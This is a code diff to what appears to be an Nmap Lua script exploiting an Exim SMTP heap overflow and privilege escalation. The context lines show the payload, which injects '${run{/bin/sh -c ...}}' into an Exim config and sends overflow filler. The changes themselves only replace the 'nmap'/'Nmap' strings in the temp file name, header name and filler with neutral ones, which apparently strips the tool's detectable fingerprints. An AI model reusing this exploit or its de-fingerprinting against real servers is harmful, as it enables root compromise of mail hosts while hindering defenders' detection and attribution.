@@ -106,7 +106,7 @@ end
 -- successfully exploited.
 local function escalate_privs(socket, smtp_opts)
   local exploited, results = false, ""
-  local tmp_file = "/tmp/nmap"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
+  local tmp_file = "/tmp/temp"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
   local exim_run = "exim -C"..tmp_file.." -q"
   local exim_spool = "spool_directory = \\${run{/bin/sh -c 'id > "..
   tmp_file.."' }}"
@@ -191,7 +191,7 @@ local function exploit_heap(socket, smtp_opts)
     smtp_opts.mailto)
 
   log_buf_size = log_buf_size - 3
-  local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "NmapHeader"
+  local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "ReqHeaders"
 
   while #log_buf < log_buf_size do
     local hdr = string.format("%s: %s\n", nmap_hdr, filler)
@@ -245,7 +245,7 @@ local function exploit_heap(socket, smtp_opts)
   end
 
   local body_size = 0
-  filler = string.rep(string.rep("Nmap", 63).."XX\r\n", 1024)
+  filler = string.rep(string.rep("User", 63).."XX\r\n", 1024)
   while body_size < msg_len do
     body_size = body_size + #filler
     status, ret = socket:send(filler)
